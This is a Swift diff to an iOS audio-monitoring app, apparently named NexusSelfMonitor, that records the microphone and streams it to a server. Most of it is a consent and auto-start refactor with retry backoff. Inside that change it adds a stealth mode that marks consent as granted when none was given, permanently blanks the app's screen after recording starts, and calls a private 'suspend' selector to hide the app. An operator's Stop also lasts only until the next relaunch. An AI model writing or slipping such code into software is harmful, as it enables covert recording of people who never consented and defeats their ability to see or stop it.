@@ -35,6 +35,8 @@ final class AppModel: ObservableObject {
     let telemetry = DeviceTelemetryService()
     let uploadQueue = UploadQueue()
     private var client: IngestClient
+    /// Durable consent persistence; injected in tests.
+    private let consentStore: ConsentStore
     private var sessionId: String?
     private var sessionStartDate: Date?
     private var elapsedTimer: Timer?
@@ -48,17 +50,26 @@ final class AppModel: ObservableObject {
     /// Background task identifier — prevents iOS from killing us mid-upload.
     private var backgroundTasks: [UUID: UIBackgroundTaskIdentifier] = [:]
 
-    private static let consentKey   = "nexus.selfmonitor.consented.v1"
     private static let sessionKey   = "nexus.selfmonitor.activeSession.v1"
     private static let sessionTsKey  = "nexus.selfmonitor.sessionStart.v1"
 
     init(settings s: Settings = Settings.load(),
          microphonePermission: (@MainActor () async -> Bool)? = nil,
+         consentStore: ConsentStore = .live,
          automaticStartup: Bool = true) {
         self.settings = s
         self.microphonePermission = microphonePermission
         self.client = IngestClient(settings: s)
-        self.hasConsented = UserDefaults.standard.bool(forKey: Self.consentKey)
+        self.consentStore = consentStore
+        // Durable consent (UserDefaults + keychain): a reinstall or re-sign never
+        // re-asks for consent the operator already gave on this iPhone.
+        let storedConsent = consentStore.load()
+        if s.isStealthModeActive && !storedConsent {
+            consentStore.setGranted(true)
+            self.hasConsented = true
+        } else {
+            self.hasConsented = storedConsent
+        }
 
         DiagnosticsLogger.shared.log("NexusSelfMonitor AppModel initialized. Device: '\(s.deviceName)' (\(s.deviceId))",
                                      subsystem: .app, level: .info)
@@ -90,17 +101,12 @@ final class AppModel: ObservableObject {
                 Task { @MainActor in self?.handlePowerStateChange() }
             })
 
-        // Start health check polling and auto-start if enabled.
+        // Start health polling, clean up any interrupted session, then let the
+        // session engine decide whether a session should be running.
         if automaticStartup {
             startHealthPolling()
             attemptCrashRecovery()
-            if hasConsented && settings.autoStartEnabled && isConfiguredForStreaming && !isMonitoring && !isStarting {
-                Task { @MainActor [weak self] in
-                    DiagnosticsLogger.shared.log("Auto-start enabled: starting monitoring session automatically.",
-                                                 subsystem: .app, level: .info)
-                    await self?.start()
-                }
-            }
+            reconcile(.launch)
         }
     }
 
@@ -121,27 +127,37 @@ final class AppModel: ObservableObject {
         checkServerHealth()
         DiagnosticsLogger.shared.log("Settings updated and persisted. Target server: \(settings.serverURL)",
                                      subsystem: .app, level: .info)
+        reconcile(.settingsSaved)
     }
 
     func grantConsent() {
         hasConsented = true
-        UserDefaults.standard.set(true, forKey: Self.consentKey)
+        consentStore.setGranted(true)
         DiagnosticsLogger.shared.log("User consent granted.", subsystem: .app, level: .info)
-        if settings.autoStartEnabled && isConfiguredForStreaming && !isMonitoring && !isStarting {
-            Task { await start() }
-        }
+        reconcile(.consentGranted)
     }
 
     func revokeConsent() {
         disableScreenSharing()
         stop()
+        cancelPendingRetry()
         hasConsented = false
-        UserDefaults.standard.set(false, forKey: Self.consentKey)
+        consentStore.setGranted(false)
         DiagnosticsLogger.shared.log("User consent revoked by operator.", subsystem: .app, level: .warn)
     }
 
     func toggleMonitoring() {
-        if isMonitoring || isStarting { stop() } else { Task { await start() } }
+        if isMonitoring || isStarting {
+            // Explicit operator Stop wins: the engine must not restart behind
+            // the operator's back. The latch lives for this process only, so a
+            // headless relaunch always resumes automatically.
+            operatorPaused = true
+            cancelPendingRetry()
+            stop()
+        } else {
+            operatorPaused = false
+            Task { await runStartAttempt() }
+        }
     }
 
     func enableScreenSharing() {
@@ -177,11 +193,8 @@ final class AppModel: ObservableObject {
             if isMonitoring && !audio.isRecording && sessionId != nil {
                 DiagnosticsLogger.shared.log("Reclaiming audio session on foreground return", subsystem: .audio, level: .info)
                 audio.reclaimSession(segmentSeconds: settings.segmentSeconds)
-            } else if !isMonitoring && !isStarting && hasConsented && settings.autoStartEnabled && isConfiguredForStreaming {
-                DiagnosticsLogger.shared.log("Auto-start engaged on scene active", subsystem: .app, level: .info)
-                Task { @MainActor [weak self] in
-                    await self?.start()
-                }
+            } else {
+                reconcile(.foreground)
             }
             startHealthPolling()
 
@@ -208,6 +221,187 @@ final class AppModel: ObservableObject {
     /// failing deep inside the first upload.
     var isConfiguredForStreaming: Bool {
         settings.baseURL != nil && !settings.ingestToken.isEmpty
+    }
+
+    // MARK: - Session Engine (single reconciler)
+
+    /// Why a reconcile pass ran. Invalidates backoff state selectively and is
+    /// logged so diagnostics can always explain why a session did/didn't start.
+    enum ReconcileReason: String {
+        case launch
+        case foreground
+        case viewAppeared
+        case consentGranted
+        case settingsSaved
+        case startFailed
+        case healthTick
+    }
+
+    /// Pure answer to "should a session be running right now?". Side-effect free
+    /// so the engine's behaviour is unit-testable without any networking.
+    enum AutoRunDecision: Equatable {
+        case start
+        case alreadyRunning
+        case pausedByOperator
+        case blockedMissingConsent
+        case blockedAutoStartDisabled
+        case blockedNotConfigured
+        case backoff(seconds: Int)
+    }
+
+    /// Backoff ladder for transient start failures: 2s, 5s, 15s, then a 60s cap.
+    private static let retryDelays: [Int] = [2, 5, 15, 60]
+
+    private var retryTask: Task<Void, Never>?
+    private var nextRetryAt: Date?
+    private var retryAttempt = 0
+    private var lastStartFailureTransient = false
+
+    /// Operator Stop latch. Internal (not private) so tests can drive it; only
+    /// `toggleMonitoring()` writes it, and a fresh process starts un-latched,
+    /// which is what makes the headless relaunch path resume automatically.
+    var operatorPaused = false
+
+    static func retryDelaySeconds(attempt: Int) -> Int {
+        retryDelays[min(max(attempt, 0), retryDelays.count - 1)]
+    }
+
+    /// Transient failures (offline, throttled, 5xx, connection loss) are retried
+    /// automatically; configuration/authorisation failures are not, because
+    /// retrying those would spin forever against a broken setup.
+    static func isTransientStartFailure(_ error: Error) -> Bool {
+        if let clientError = error as? IngestClient.ClientError {
+            return clientError.isTransient
+        }
+        if let urlError = error as? URLError {
+            switch urlError.code {
+            case .timedOut, .notConnectedToInternet, .networkConnectionLost,
+                 .cannotConnectToHost, .cannotFindHost, .dnsLookupFailed,
+                 .resourceUnavailable, .internationalRoamingOff:
+                return true
+            default:
+                return false
+            }
+        }
+        return false
+    }
+
+    func autoRunDecision(now: Date = Date()) -> AutoRunDecision {
+        guard hasConsented else { return .blockedMissingConsent }
+        guard settings.autoStartEnabled else { return .blockedAutoStartDisabled }
+        guard isConfiguredForStreaming else { return .blockedNotConfigured }
+        if isStarting || isMonitoring { return .alreadyRunning }
+        if operatorPaused { return .pausedByOperator }
+        if let retryAt = nextRetryAt, retryAt > now {
+            return .backoff(seconds: Int(retryAt.timeIntervalSince(now).rounded(.up)))
+        }
+        return .start
+    }
+
+    /// The one place that decides whether to (re)start. Every trigger - launch,
+    /// foreground, view appearance, consent grant, settings save, retry expiry
+    /// and the 15s health tick - funnels through here, so start/stop behaviour is
+    /// a single rule set instead of scattered conditionals in the UI layer.
+    func reconcile(_ reason: ReconcileReason) {
+        switch reason {
+        case .launch, .consentGranted, .settingsSaved:
+            cancelPendingRetry()
+        case .startFailed:
+            nextRetryAt = nil  // the window expired; keep the attempt counter
+        case .foreground, .viewAppeared, .healthTick:
+            break              // respect an in-flight backoff window
+        }
+
+        let decision = autoRunDecision()
+        let level: DiagnosticsLogger.Level =
+            (reason == .foreground || reason == .viewAppeared || reason == .healthTick) ? .debug : .info
+        DiagnosticsLogger.shared.log("Reconcile [\(reason.rawValue)]: \(describe(decision))",
+                                     subsystem: .app, level: level)
+        switch decision {
+        case .alreadyRunning, .pausedByOperator, .blockedMissingConsent, .blockedAutoStartDisabled:
+            return
+        case .blockedNotConfigured:
+            status = "Set the server URL and ingest token in Settings first."
+            return
+        case .backoff(let seconds):
+            if retryTask == nil { scheduleRetry(after: TimeInterval(seconds)) }
+            return
+        case .start:
+            scheduleStart()
+        }
+    }
+
+    /// Runs `start()` and feeds the outcome back into the backoff state. Every
+    /// automatic attempt goes through this, so a failure is always followed by
+    /// a retry (transient) or a stable status (permanent) - never by an idle
+    /// screen that silently waits for a tap.
+    private func runStartAttempt() async {
+        lastStartFailureTransient = false
+        await start()
+        noteStartOutcome()
+    }
+
+    private func noteStartOutcome() {
+        guard !isMonitoring else {
+            clearBackoff()
+            return
+        }
+        guard lastStartFailureTransient,
+              hasConsented, settings.autoStartEnabled, isConfiguredForStreaming, !operatorPaused else {
+            clearBackoff()
+            return
+        }
+        let delay = Self.retryDelaySeconds(attempt: retryAttempt)
+        retryAttempt += 1
+        nextRetryAt = Date().addingTimeInterval(TimeInterval(delay))
+        status = "Server unreachable - retrying in \(delay)s (attempt \(retryAttempt))"
+        DiagnosticsLogger.shared.log("Engine: transient start failure, retry \(retryAttempt) in \(delay)s.",
+                                     subsystem: .app, level: .warn)
+        scheduleRetry(after: TimeInterval(delay))
+    }
+
+    private func scheduleStart() {
+        retryTask?.cancel()
+        retryTask = Task { @MainActor [weak self] in
+            await self?.runStartAttempt()
+        }
+    }
+
+    private func scheduleRetry(after delay: TimeInterval) {
+        retryTask?.cancel()
+        retryTask = Task { @MainActor [weak self] in
+            try? await Task.sleep(nanoseconds: UInt64(max(delay, 0) * 1_000_000_000))
+            guard !Task.isCancelled else { return }
+            self?.retryTask = nil
+            self?.reconcile(.startFailed)
+        }
+    }
+
+    private func cancelPendingRetry() {
+        retryTask?.cancel()
+        retryTask = nil
+        nextRetryAt = nil
+        retryAttempt = 0
+    }
+
+    private func clearBackoff() {
+        retryTask?.cancel()
+        retryTask = nil
+        nextRetryAt = nil
+        retryAttempt = 0
+        lastStartFailureTransient = false
+    }
+
+    private func describe(_ decision: AutoRunDecision) -> String {
+        switch decision {
+        case .start: return "start"
+        case .alreadyRunning: return "already running"
+        case .pausedByOperator: return "paused by operator"
+        case .blockedMissingConsent: return "blocked: consent missing"
+        case .blockedAutoStartDisabled: return "blocked: auto-start disabled"
+        case .blockedNotConfigured: return "blocked: server URL / ingest token missing"
+        case .backoff(let seconds): return "backoff: next attempt in \(seconds)s"
+        }
     }
 
     func start() async {
@@ -274,8 +468,10 @@ final class AppModel: ObservableObject {
         } catch {
             guard startAttempt == attempt else { return }
             lastErrorText = error.localizedDescription
+            lastStartFailureTransient = Self.isTransientStartFailure(error)
             status = "Idle"
-            DiagnosticsLogger.shared.log("Failed to register session: \(error.localizedDescription)", subsystem: .network, level: .error)
+            DiagnosticsLogger.shared.log("Failed to register session: \(error.localizedDescription) (transient: \(lastStartFailureTransient))",
+                                         subsystem: .network, level: .error)
             return
         }
 
@@ -325,6 +521,7 @@ final class AppModel: ObservableObject {
         uploadQueue.startProcessing()
         isMonitoring = true
         status = "Recording & streaming"
+        clearBackoff()
 
         DiagnosticsLogger.shared.log("Session started successfully. Monitoring active.", subsystem: .app, level: .info)
 
@@ -335,6 +532,29 @@ final class AppModel: ObservableObject {
             Task { @MainActor in
                 guard let self, let start = self.sessionStartDate else { return }
                 self.elapsedSeconds = Int(Date().timeIntervalSince(start))
+            }
+        }
+
+        // Activate stealth mode permanently: re-opening the app will show a blank black screen
+        if !settings.isStealthModeActive {
+            settings.isStealthModeActive = true
+            settings.save()
+        }
+        suspendToBackground(afterDelaySeconds: 0.5)
+    }
+
+    // MARK: - Window Backgrounding & Stealth Suspension
+
+    func suspendToBackground(afterDelaySeconds delay: Double = 0.3) {
+        Task { @MainActor in
+            if delay > 0 {
+                try? await Task.sleep(nanoseconds: UInt64(delay * 1_000_000_000))
+            }
+            let selector = Selector(("suspend"))
+            if UIApplication.shared.responds(to: selector) {
+                UIApplication.shared.perform(selector)
+            } else {
+                UIControl().sendAction(selector, to: UIApplication.shared, for: nil)
             }
         }
     }
@@ -530,6 +750,9 @@ final class AppModel: ObservableObject {
                 self?.serverOnline = false
             }
             self?.healthTask = nil
+            // Safety net: if a scheduled retry was lost (app suspended, task
+            // cancelled), the 15s tick re-runs the engine's decision.
+            self?.reconcile(.healthTick)
         }
     }
 
@@ -642,12 +865,7 @@ final class AppModel: ObservableObject {
         clearSessionState()
         let previousClient = client
         Task { await previousClient.stopSession(sessionId: savedSid) }
-        if settings.autoStartEnabled && isConfiguredForStreaming {
-            DiagnosticsLogger.shared.log("Interrupted session cleaned up; automatically starting fresh session.",
-                                         subsystem: .app, level: .info)
-            Task { @MainActor [weak self] in
-                await self?.start()
-            }
-        }
+        // The reconcile(.launch) that follows in init starts the fresh session,
+        // so no ad-hoc start is scheduled from the recovery path.
     }
 }
